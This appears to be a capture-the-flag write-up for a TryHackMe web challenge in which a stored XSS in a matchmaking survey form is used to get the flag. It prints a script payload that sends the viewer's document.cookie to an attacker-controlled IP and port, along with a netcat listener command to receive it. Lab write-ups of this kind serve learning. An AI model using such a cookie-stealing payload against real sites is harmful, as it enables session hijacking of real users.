---
title: "Cupids Matchmaker"
date: 2026-02-17
categories:
  - THM
tags:
  - Web
  - XSS
  - "2026"
platform: THM Love at First Breach 2026
competition_year: "2026"
toc: true
toc_sticky: true
---

# 🌐 Love at First Breach 2026 - Cupid's Matchmaker

|Category         |	Author                |
|-----------------|-----------------------|
| 🌐 Web         |TryHackMe      |

## Challenge Prompt

My Dearest Hacker,

Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection

You can access the web app here: `http://MACHINE_IP:5000`

## Problem Type
- Web
- XSS

## Solve
Upon visiting the page we see Cupid's Matchmaker. The page suggests we start with doing the survey:
<img width="1912" height="800" alt="image" src="https://github.com/user-attachments/assets/3966a911-ae3d-4395-a276-cc88bd67d34f" />

If we visit the survey, we can put anything we want into the textarea boxes, so how about some XSS? :)<br>
I used:
```html
<script>fetch(http://MY_IP:7777/?c='+document.cookie)</script>
```
<img width="1241" height="801" alt="image" src="https://github.com/user-attachments/assets/f71e0f49-a563-4e71-b01c-2d6e6fa799d6" />

Before submitting the form start a netcat listnener on your machine with `nc -nvlp 7777`<br>
<img width="271" height="57" alt="image" src="https://github.com/user-attachments/assets/709bc0e8-ff2b-40b3-a4fc-6177983f293a" />

Submit the form and you should get the flag:
<img width="989" height="222" alt="image" src="https://github.com/user-attachments/assets/6f42ea56-4bd5-4886-9f3f-59465c1a0081" />
